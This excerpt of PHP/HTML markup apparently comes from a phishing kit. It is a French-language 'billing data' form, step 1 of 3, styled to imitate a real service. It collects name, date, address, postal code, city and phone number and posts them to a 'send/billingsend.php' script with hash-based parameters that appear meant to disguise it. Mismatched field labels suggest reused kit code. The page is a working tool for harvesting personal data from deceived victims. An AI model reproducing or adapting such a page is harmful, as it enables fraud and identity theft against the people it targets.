                    ...
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/billingsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">ÉTAPE 1 SUR 3</div>
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Données de facturation</h3>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">name</legend>
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Name" display="inline" id="surname" name="surname" maxlength="" minlength="2" placeholder="Nom" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                ...
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    ...
                                    <span style="position: relative; display: block;">
                                                <input aria-label="First name" display="inline" id="name" name="name" minlength="2"  maxlength="" placeholder="Prénom" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
        ...
        date.addEventListener('input', function(e) {
            ...
            this.value = output.join('').substr(0, 14);
                                ...
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    ...
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="address" name="address" maxlength="" placeholder="Adresse" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required minlength="6">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Postal code</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="zipcode" display="inline"  id="zipcode" name="zipcode"  maxlength="5" minlength="4" placeholder="Code postal" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" type="tel" onkeypress="return onlyNumberKey(event)" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
<script>
    function onlyNumberKey(evt) {
        ...
        return true;
                                ...
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" minlength="3" id="city" name="city" maxlength="" placeholder="Ville" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="password" name="tel" maxlength="30" placeholder="Numéro de téléphone" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" minlength="9" type="tel" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
